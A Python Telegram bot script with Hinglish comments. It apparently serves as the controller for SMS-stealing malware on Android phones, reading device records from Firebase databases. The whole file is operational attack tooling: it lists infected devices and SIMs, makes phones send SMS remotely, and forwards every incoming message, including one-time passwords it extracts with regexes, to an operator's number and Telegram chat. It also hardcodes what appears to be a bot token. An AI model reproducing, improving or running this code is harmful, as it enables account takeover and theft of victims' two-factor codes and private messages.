#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler,
)

# ============================
# LOGGING & CONFIG
# ============================
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "9003756305:AAE7LS0Lik6wcPbdBHbWbJ9X4_4UJq2Lc1w")
BOT_NAME = "ANY AUTO BOT V14 ⚡"

_http_session = requests.Session()
_adapter = HTTPAdapter(pool_connections=100, pool_maxsize=200, max_retries=Retry(total=1, backoff_factor=0.05))
_http_session.mount("https://", _adapter)
_http_session.mount("http://", _adapter)

def fast_get(url, timeout=2):
    try: return _http_session.get(url, timeout=timeout)
    except: return None

def fast_put(url, data, timeout=2):
    try: return _http_session.put(url, json=data, timeout=timeout)
    except: return None

USER_CONFIG_FILE = "user_config.json"
user_configs = {}
last_otp = {}
SMS_PATH_CACHE = {}
CLIENTS_PATH_CACHE = {}
OTP_PATH_CACHE = {}
MSG_PATH_CACHE = {}

def load_user_configs():
    global user_configs
    if os.path.exists(USER_CONFIG_FILE):
        try:
            with open(USER_CONFIG_FILE, "r") as f: user_configs = json.load(f)
            for uid, cfg in user_configs.items():
                if "sms_path_cache" in cfg: SMS_PATH_CACHE[uid] = cfg["sms_path_cache"]
                if "clients_path_cache" in cfg: CLIENTS_PATH_CACHE[uid] = cfg["clients_path_cache"]
                if "msg_path_cache" in cfg: MSG_PATH_CACHE[uid] = cfg["msg_path_cache"]
        except: pass

def save_user_configs():
    try:
        with open(USER_CONFIG_FILE, "w") as f: json.dump(user_configs, f, indent=2)
    except: pass

load_user_configs()

URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

OTP_PATHS = ["otp", "OTP", "otps", "otpCode", "code"]
SMS_COMMAND_PATHS = ["clients/{device_id}/webhookEvent/sendSms", "devices/{device_id}/sendSms"]
CLIENTS_PATHS = ["clients", "devices", "users"]
MESSAGES_PATHS = ["messages/{device_id}", "sms/{device_id}", "clients/{device_id}/messages"]

# ============================
# HELPERS
# ============================
def get_field(data, field_type, default=None):
    keys = {
        "name": ["modelName", "model", "deviceName", "name"],
        "battery": ["battery", "batteryLevel", "bat"],
        "status": ["status", "is_online", "online", "active"],
        "phone": ["mobNo", "phone", "phoneNumber", "number"],
        "sims": ["sims", "sim_info", "simInfo", "sim"]
    }.get(field_type, [])
    if not isinstance(data, dict): return default
    for key in keys:
        if key in data and data[key] is not None: return data[key]
    return default

def is_online(info):
    status = get_field(info, "status")
    if status is None: return False
    if isinstance(status, bool): return status
    if isinstance(status, (int, float)): return status == 1
    if isinstance(status, str): return status.lower() in ["true", "online", "active", "1"]
    return False

def normalize_sims(sims):
    if not sims: return []
    if isinstance(sims, list): return sims
    if isinstance(sims, dict): return list(sims.values())
    return []

def get_sim_phone(sim):
    if not isinstance(sim, dict): return "Unknown"
    for key in ["phoneNumber", "number", "phone", "mobNo"]:
        if key in sim and sim[key]: return str(sim[key])
    return "Unknown"

def get_sim_slot(sim, default=0):
    if not isinstance(sim, dict): return default
    for key in ["simSlotIndex", "slot", "slotIndex"]:
        if key in sim and sim[key] is not None: 
            try: return int(sim[key])
            except: return default
    return default

def firebase_get(user_id, path, timeout=2):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"): return None
    url = f"{cfg['firebase_url'].rstrip('/')}/{path}.json"
    resp = fast_get(url, timeout=timeout)
    if resp and resp.status_code == 200:
        try: return resp.json()
        except: return None
    return None

def firebase_put(user_id, path, data, timeout=2):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"): return False
    url = f"{cfg['firebase_url'].rstrip('/')}/{path}.json"
    resp = fast_put(url, data, timeout=timeout)
    return resp is not None and resp.status_code in [200, 201]

def get_clients_path(user_id):
    uid = str(user_id)
    if uid in CLIENTS_PATH_CACHE: return CLIENTS_PATH_CACHE[uid]
    for path in CLIENTS_PATHS:
        if firebase_get(user_id, path):
            CLIENTS_PATH_CACHE[uid] = path
            return path
    return None

def get_otp_path(user_id):
    uid = str(user_id)
    if uid in OTP_PATH_CACHE: return OTP_PATH_CACHE[uid]
    for path in OTP_PATHS:
        if firebase_get(user_id, path) is not None:
            OTP_PATH_CACHE[uid] = path
            return path
    return None

def get_messages_path(user_id, device_id):
    uid = str(user_id)
    if uid in MSG_PATH_CACHE: return MSG_PATH_CACHE[uid]
    for template in MESSAGES_PATHS:
        if firebase_get(user_id, template.format(device_id=device_id)):
            MSG_PATH_CACHE[uid] = template
            return template
    return None

def get_online_devices(user_id):
    path = get_clients_path(user_id)
    if not path: return {}
    data = firebase_get(user_id, path)
    if not data or not isinstance(data, dict): return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict): continue
        if "info" in info and isinstance(info["info"], dict): info = {**info, **info["info"]}
        if not is_online(info): continue
        online[dev_id] = {
            "id": dev_id,
            "modelName": str(get_field(info, "name", "Unknown")),
            "sims": normalize_sims(get_field(info, "sims", [])),
            "raw": info
        }
    return online

def fetch_otp(user_id):
    path = get_otp_path(user_id)
    if not path: return None
    data = firebase_get(user_id, path)
    if isinstance(data, dict):
        for key in ["otp", "code", "value"]: 
            if key in data and data[key]: return str(data[key]).strip()
        return None
    return str(data).strip() if data else None

# ============================
# ✅ 100% FIXED SMS SENDER (from: 0 / 1)
# ============================
def send_sms_command(user_id, device_id, to_number, message):
    full_message = str(message).strip()
    if not full_message: return False

    uid = str(user_id)
    selected = get_selected(uid)
    
    # User ne jo tap kiya (0 ya 1), wo nikaalo
    try: 
        sim_slot = int(selected.get("simSlotIndex", 0))
    except: 
        sim_slot = 0

    # Exact format jo tumhare JSON me tha
    payload = {
        "from": sim_slot,                 # 👈 0 = SIM 1, 1 = SIM 2
        "isSended": False,
        "message": full_message,
        "timestamp": int(time.time()),
        "to": to_number
    }

    cached = SMS_PATH_CACHE.get(uid)
    if cached:
        if firebase_put(user_id, cached.format(device_id=device_id), payload):
            logger.info(f"⚡ SMS sent → {to_number} | from_slot={sim_slot}")
            return True
        SMS_PATH_CACHE.pop(uid, None)

    for path_template in SMS_COMMAND_PATHS:
        if firebase_put(user_id, path_template.format(device_id=device_id), payload):
            SMS_PATH_CACHE[uid] = path_template
            save_user_configs()
            logger.info(f"📤 SMS sent via {path_template} | from_slot={sim_slot}")
            return True

    return False

def fetch_messages(user_id, device_id):
    template = get_messages_path(user_id, device_id)
    if not template: return None
    return firebase_get(user_id, template.format(device_id=device_id))

def extract_otp_from_text(text):
    if not text: return None
    patterns = [r"(?:otp|code|pin)\s*(?:is|:|\-|=)?\s*([A-Za-z0-9]{4,10})", r"(?<!\d)(\d{4,8})(?!\d)"]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m: return m.group(1)
    return None

def _escape_html(s): return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def send_message_with_copy(chat_id, display_text, copy_text):
    safe = _escape_html(copy_text)
    text = f"{display_text}\n\n👇 <b>Tap to copy 👇</b>\n<code>{safe}</code>"
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=3)
    except: pass

def send_otp_with_buttons(chat_id, header, otp, full_message, to_number=None):
    otp_safe, msg_safe = _escape_html(otp), _escape_html(full_message)
    text = f"{header}\n\n"
    if to_number: text += f"📞 To: <code>{_escape_html(to_number)}</code>\n"
    text += f"\n🔑 <b>OTP:</b>\n<code>{otp_safe}</code>\n<i>(tap to copy)</i>\n\n"
    text += f"📝 <b>Full Message:</b>\n<code>{msg_safe}</code>\n<i>(tap to copy)</i>"
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=3)
    except: pass

def get_selected(user_id): return user_configs.get(str(user_id), {}).get("selectedDevice", {})
def get_otp_number(user_id): return user_configs.get(str(user_id), {}).get("otpNumber")
def set_otp_number(user_id, number):
    if str(user_id) in user_configs:
        user_configs[str(user_id)]["otpNumber"] = number
        save_user_configs()

def initialize_processed_keys(user_id, device_id):
    cfg = user_configs.get(str(user_id))
    if not cfg: return
    msgs = fetch_messages(user_id, device_id)
    cfg["processed_keys"] = list(msgs.keys()) if isinstance(msgs, dict) else []
    cfg["processed_device"] = device_id
    save_user_configs()

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {"deviceId": device_id, "simSlotIndex": sim_slot, "simPhoneNumber": sim_phone}
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()

# ============================
# BOT HANDLERS
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"⚡ {BOT_NAME} ⚡\n\n/setup - Firebase\n/devices - Select SIM\n/setotp - Forward number\n/status - Check", parse_mode='HTML')

async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📌 Step 1/2: Send Firebase URL\n/cancel to abort")
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip().rstrip("/")
    if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
        await update.message.reply_text("❌ Invalid URL.")
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text("✅ URL saved.\n📌 Step 2/2: Send Channel ID")
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: channel_id = int(update.message.text.strip())
    except ValueError: 
        await update.message.reply_text("❌ Channel ID must be number.")
        return CHANNEL
    user_id = str(update.effective_user.id)
    user_configs[user_id] = {"firebase_url": context.user_data["firebase_url"], "channel_id": channel_id, "selectedDevice": {}, "otpNumber": None, "processed_keys": []}
    save_user_configs()
    await update.message.reply_text("✅ Setup Complete!\nNext: /devices")
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("❌ No online devices.")
        return
    keyboard = [[InlineKeyboardButton(f"📱 {d['modelName']}", callback_data=f"dev_{did}")] for did, d in online.items()]
    await update.message.reply_text("👇 Select device:", reply_markup=InlineKeyboardMarkup(keyboard[:20]))

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    device_id = query.data.replace("dev_", "")
    user_id = str(update.effective_user.id)
    online = get_online_devices(user_id)
    if device_id not in online:
        await query.edit_message_text("❌ Device offline.")
        return
    await _show_sim_selection(query, user_id, device_id, online[device_id])

async def _show_sim_selection(update_or_query, user_id, device_id, device_data):
    sims = device_data.get("sims", [])
    keyboard = []
    if sims:
        for sim in sims:
            slot = get_sim_slot(sim, 0)       # 0 ya 1
            phone = get_sim_phone(sim)
            label = f"📶 SIM {slot + 1} — {phone}"
            # Exact slot (0/1) pass kar rahe hain
            keyboard.append([InlineKeyboardButton(label, callback_data=f"sim_{device_id}|{slot}|{phone}")])
    else:
        keyboard.append([InlineKeyboardButton("📶 SIM 1", callback_data=f"sim_{device_id}|0|Unknown")])
        keyboard.append([InlineKeyboardButton("📶 SIM 2", callback_data=f"sim_{device_id}|1|Unknown")])
    
    text = f"✅ {device_data['modelName']}\n🆔 {device_id}\n\n👇 Select SIM:"
    if hasattr(update_or_query, 'message'):
        await update_or_query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update_or_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    
    parts = query.data[len("sim_"):].split("|")
    if len(parts) != 3:
        await query.edit_message_text("❌ Invalid selection.")
        return
    
    device_id, slot_str, phone = parts
    
    # Save exact slot (0 ya 1)
    set_selected(user_id, device_id, slot_str, phone)
    sim_label = f"SIM {int(slot_str) + 1}" if slot_str.isdigit() else f"Slot {slot_str}"
    
    await query.edit_message_text(
        f"✅ {sim_label} Selected!\n"
        f"📱 {device_id}\n"
        f"📶 Index: {slot_str}\n"
        f"📞 Phone: {phone}\n\n"
        f"⚡ Ab SMS isi SIM se jayega.\nNext: /setotp"
    )

async def _send_test_sms(update: Update, user_id, forward_number):
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("⚠️ Pehle /devices se SIM select karo.")
        return
    device_id = selected["deviceId"]
    sim_slot = selected.get("simSlotIndex", 0)
    sim_label = f"SIM {int(sim_slot) + 1}" if str(sim_slot).isdigit() else "SIM"
    
    await update.message.reply_text(f"🧪 Test SMS bhej raha hoon ({sim_label})...")
    if send_sms_command(user_id, device_id, forward_number, "fwd test by anyxpapa"):
        await update.message.reply_text(f"✅ Test SMS bhej diya {sim_label} se!")
    else:
        await update.message.reply_text(f"❌ Fail! Firebase check karo.")

async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("❌ Invalid number.")
            return
        set_otp_number(user_id, number)
        await update.message.reply_text(f"✅ Forward number set: {number}")
        await _send_test_sms(update, user_id, number)
        return
    await update.message.reply_text("📞 Send phone number:\nExample: +919876543210\n/cancel to abort")
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("❌ Invalid number.")
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"✅ Forward number set: {number}")
    await _send_test_sms(update, user_id, number)
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    cfg = user_configs.get(user_id, {})
    s = cfg.get("selectedDevice", {})
    slot = s.get("simSlotIndex", "None")
    label = f"SIM {int(slot) + 1}" if str(slot).isdigit() else "None"
    await update.message.reply_text(f"📊 Status\n🌐 URL: {cfg.get('firebase_url')}\n📱 Device: {s.get('deviceId')}\n📶 Selected: {label} (Index {slot})\n📞 Forward: {cfg.get('otpNumber')}")

# ============================
# MESSAGE LOOP
# ============================
def handle_incoming_messages():
    while True:
        try:
            for user_id, cfg in list(user_configs.items()):
                fwd_num = cfg.get("otpNumber")
                sel = cfg.get("selectedDevice", {})
                if not fwd_num or not sel.get("deviceId"): continue
                
                device_id = sel["deviceId"]
                if cfg.get("processed_device") != device_id:
                    initialize_processed_keys(user_id, device_id)
                
                msgs = fetch_messages(user_id, device_id)
                if not isinstance(msgs, dict): continue
                
                processed = set(cfg.get("processed_keys", []))
                new_keys = []
                
                for k, v in msgs.items():
                    if k in processed: continue
                    if not isinstance(v, dict): continue
                    
                    text = v.get("message") or v.get("body") or v.get("text")
                    msg_type = str(v.get("type", "")).lower()
                    new_keys.append(k)
                    
                    if text and msg_type not in ["outgoing", "sent"]:
                        send_sms_command(user_id, device_id, fwd_num, text)
                        otp = extract_otp_from_text(text)
                        if otp: send_otp_with_buttons(int(user_id), "✅ Forwarded", otp, text, to_number=fwd_num)
                        else: send_message_with_copy(int(user_id), f"✅ Forwarded to {fwd_num}", text)
                
                if new_keys:
                    cfg["processed_keys"].extend(new_keys)
                    save_user_configs()
        except Exception as e: logger.error(f"Loop error: {e}")
        time.sleep(1)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    threading.Thread(target=handle_incoming_messages, daemon=True).start()
    
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)], CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]},
        fallbacks=[CommandHandler("cancel", setup_cancel)]
    ))
    
    app.add_handler(ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]},
        fallbacks=[CommandHandler("cancel", otp_cancel)]
    ))
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    
    logger.info("🤖 Bot Started...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()